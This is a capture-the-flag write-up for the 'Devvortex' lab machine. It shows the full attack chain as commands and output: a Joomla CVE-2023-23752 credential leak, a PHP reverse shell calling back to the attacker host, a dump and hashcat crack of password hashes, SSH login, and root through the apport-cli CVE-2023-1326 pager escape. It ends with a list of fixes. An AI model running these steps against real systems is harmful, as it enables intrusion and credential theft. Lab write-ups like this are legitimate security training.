# Devvortex Write-Up

Target: 10.10.11.242

---

## Initial Reconnaissance
	- Port Scanning: 22, 80
		- Command: nmap -sV -sC -vv 10.10.11.242
		- Output: SSH/22 HTTP/80 devvortex.htb
	- Observations: Ubuntu

---

## Enumeration
	- Service Exploration: 
		- Service 1: FFUF
			- Command: ffuf -u http://10.10.11.242/ -w /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.devvortex.htb" -fc 302
			- Output: dev [Status: 200, Size: 23221, Words: 5081, Lines: 502, Duration: 116ms]
		
		- Service 2: FFUF
			- Command: ffuf -u http://10.10.11.242/FUZZ -w /opt/useful/SecLists/Discovery/Web-Content/raft-medium-directories.txt -H "Host: dev.devvortex.htb"
			- Output: http://dev.devvortex.htb/administrator/
		
		- Service 3: FFUF
			- Command: ffuf -u http://10.10.11.242/FUZZ -w /opt/useful/SecLists/Discovery/Web-Content/CMS/trickest-cms-wordlist/joomla.txt -H  "Host: dev.devvortex.htb" | grep  'joomla.xml'
			- Output: administrator/manifests/files/joomla.xml
						administrator/manifests/libraries/joomla.xml
						plugins/user/joomla/joomla.xml
						plugins/actionlog/joomla/joomla.xml
						plugins/extension/joomla/joomla.xml
						plugins/authentication/joomla/joomla.xml
						plugins/content/joomla/joomla.xml

	- Manual Checks: Google search="What joomla file exposes the version number over HTTP"
	- Key Findings: administrator/manifests/files/joomla.xml* Joomla version 4.2.6
					dev.devvortex.htb	mutiple input fields	use "HTTP" in google searches
---

## Exploitation - CVE-2023-23752
	- Initial Access: Joomla Login Page
		- Command: sudo python3 exploit.py -u dev.devvortex.htb -o login.txt
		- Output: [+] => Vulnerable dev.devvortex.htb
					User: lewis Password: P4ntherg0t1n5r3c0n## Database: joomla
					File Saved => login.txt
					
					lewis@devvortex.htb
					logan@devvortex.htb
	- Shell Access: PHP Reverse Shell Admin Template
		- Command: https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
		- Output: connect to [10.10.16.5] from (UNKNOWN) [10.10.11.242] 60872                                                                                                           
		Linux devvortex 5.4.0-167-generic #184-Ubuntu SMP Tue Oct 31 09:21:49 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux                                                         
		 01:19:32 up  3:46,  0 users,  load average: 0.01, 0.10, 0.06                                                                                                         
		USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT                                                                                                   
		uid=33(www-data) gid=33(www-data) groups=33(www-data)
		/bin/sh: 0: can't access tty; job control turned off
		
		- Upgrading Dumb Shell: $
		- Command: python3 -c 'import pty; pty.spawn("/bin/bash")'
		- Output: www-data@devvortex:/$
	- Database Terminal Access: joomla
		- Command: mysql -u lewis -p joomla
		- Output: Enter Password: P4ntherg0t1n5r3c0n##
					mysql> 
---

## Gaining User Access via SSH
	- Step 1: Information Gathering: MYSQL Database
		- System Info: MYSQL
			- Command: SELECT @@version
			- Output: 8.0.35-0ubuntu0.20.04.1
		- User Context: SQL Grants
			- Command: SHOW GRANTS;
			- Output:   +-----------------------------------------------------------+
						| Grants for lewis@localhost                                |
						+-----------------------------------------------------------+
						| GRANT USAGE ON *.* TO `lewis`@`localhost`                 |
						| GRANT ALL PRIVILEGES ON `joomla`.* TO `lewis`@`localhost` |
						+-----------------------------------------------------------+

		- Automated Tools:
			- Command:
			- Output:
	- Step 2: Identify Vectors: Table with credentials 
		- SUID Binaries:
			- Command:
			- Output:
		- Cron Jobs:
			- Command:
			- Output:
		- Kernel Exploits:
			- Command:
			- Output:
		- Misconfigurations: sd4fg_users
			- Command: SELECT * FROM sd4fg_users
			- Output: lewis@devvortex.htb | $2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u
					  logan@devvortex.htb | $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12
	- Step 3: Exploit the Vector: hashcat
		- Command: hashcat -m 3200 -a 0 -w 3 -O joomla.hash /usr/share/hashcat/rockyou.txt -o cracked.hash --status
		- Output: $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12:tequieromucho (1/2)
		- Command: 
		- Output: 
	- Step 4: Verify Access: SSH
		- Command:ssh logan@devvortex.htb
				  Password: tequieromucho
		- Output: logan@devvortex:~$ 
	- Step 5: User Flag
		- Command: cat user.txt
		- Output: 2db0a045b823b93e5b9dbfc65bd8bd12

---

## Privilege Escalation
	- Step 1: Information Gathering:
		- System Info: Ubuntu
			- Command: systemctl --version
			- Output: systemd 245 (245.4-4ubuntu3.22)
		- User Context: logan@devvortex.htb
			- Command: sudo -l
			- Output: /usr/bin/apport-cli
		- Automated Tools:
			- Command:
			- Output:
	- Step 2: Identify Vectors:
		- SUID Binaries:
			- Command:
			- Output:
		- Cron Jobs:
			- Command:
			- Output:
		- Kernel Exploits:
			- Command:
			- Output:
		- Misconfigurations: /usr/bin/apport-cli
			- Command: sudo /usr/bin/apport-cli -v
			- Output: 2.20.11
	- Step 3: Exploit the Vector: CVE-2023-1326 , During crash report viewing, the tool uses less as a pager without dropping root priviledges, enables the user to spawn a root shell with !/bin/bash.
		- Command:sudo /usr/bin/apport-cli -c .apport/.crash file 
		- Output: logan@devvortex:/var/crash$ sudo /usr/bin/apport-cli -c .apport/.crash file

					*** Collecting problem information

					The collected information can be sent to the developers to improve the
					application. This might take a few minutes.
					..............

					*** Send problem report to the developers?

					After the problem report has been sent, please fill out the form in the
					automatically opened web browser.

					What would you like to do? Your options are:
					  S: Send report (1.9 KB)
					  V: View report
					  K: Keep report file for sending later or copying to somewhere else
					  I: Cancel and ignore future crashes of this program version
					  C: Cancel
					Please choose (S/V/K/I/C): v
					!id
					uid=0(root) gid=0(root) groups=0(root)
					!done  (press RETURN)!/bin/bash
		
	- Step 4: Verify Access: root access
		- Command: root@devvortex:/var/crash# cd /root
		- Output: root.txt
---

## Post-Exploitation
	- Flag Retrieval: root.txt
		- Command: cd /root
				   ls
				   cat root.xt
		- Output: 02a539587474cffb9a99a3462a2c4eb7
	- Persistence (Optional):
	- Evidence:

---

## Conclusion
- Summary: I was able to utilize multiple tools and techniques such as:
	 1. endpoint enumeration for version information
	 2. exploit joomla for login information
	 3. php scripting to start a user www-data reverse shell through the templates on the CMS
	 4. use python to upgrade to a psuedo terminal
	 5. utilize terminal to access MySQL database to pull encrypted credentials
	 6. use hashchat to --identify -m  and crack the credential for logan@devvortex for ssh access
	 7. use ssh access to find a possible exploit vector, such as apport-cli with sudo priviledges
	 8. escalate priviledge by starting a shell while viewing apport-cli report
- Lessons Learned:
	1. Correct Placement of FUZZ in FFUF Commands: Place FUZZ in the Host header for subdomains (e.g., FUZZ.devvortex.htb) and in the URL path for directories (e.g., 10.10.11.242/FUZZ) to ensure effective scans.
	2. Always Enumerate Subdomains: Thoroughly enumerate subdomains to find hidden services like dev.devvortex.htb, which hosted the Joomla instance.
	3. Choose the Right Wordlist for the Task: Use specific wordlists for each goal—DNS for subdomains, web content for directories, and CMS-focused for components like Joomla files.
	4. Identify CMS Versions for Exploits: Check CMS files (e.g., joomla.xml) for version info (e.g., Joomla 4.2.6) to find known vulnerabilities like CVE-2023-23752.
	5. Leverage Database Access for Credentials: Enumerate CMS databases (e.g., sd4fg_users in Joomla) to extract and crack user credentials for further access.
	6. Upgrade Shells for Better Interaction: Upgrade basic shells with python3 -c 'import pty; pty.spawn("/bin/bash")' for a fully interactive shell.
	7. Check Sudo Permissions for Privilege Escalation: Use sudo -l to find commands (e.g., apport-cli) that can be run with elevated privileges for escalation.
	8. Research Tools for Known Vulnerabilities: Research tool versions (e.g., apport-cli 2.20.11) for exploits like CVE-2023-1326 to escalate privileges.
	9. Use Manual Checks Alongside Automated Tools: Combine manual research (e.g., Google search for Joomla version files) with automated enumeration to uncover critical info.
	10. Always check for /robots.txt manually first to reveal hidden directories that sites block from search engines.
		- Fixes:
		1. Patch Joomla for CVE-2023-23752: Update Joomla beyond 4.2.6.
		2. Restrict Joomla Version File Access: Block joomla.xml with .htaccess.
		3. Secure Joomla Database Credentials: Use strong, limited database permissions.
		4. Remove Sudo for apport-cli: Revoke logan’s sudo on apport-cli.
		5. Update apport-cli for CVE-2023-1326: Patch apport-cli to latest version.
		6. Implement Web Application Firewall: Add WAF to block malicious requests.
		7. Disable Directory Listing: Use Options -Indexes in Apache.
		8. Restrict MySQL User Privileges: Limit lewis to minimal database access.
		9. Monitor for Exposed CMS Files: Audit for files like joomla.xml.
		10. Regular Security Patching: Apply updates to Joomla, Ubuntu systems.

---

## Appendix
- Additional Details: 
- Tools and Exploits: find . -name *example*		hashcat --identify		"example command | grep"		/usr/share/hashcat/rockyou.txt		CVE-2023-23752: Joomla exploit for initial access.		CVE-2023-1326: apport-cli privilege escalation exploit.		PHP Reverse Shell: From pentestmonkey GitHub.		SecLists: Wordlists for FFUF enumeration.	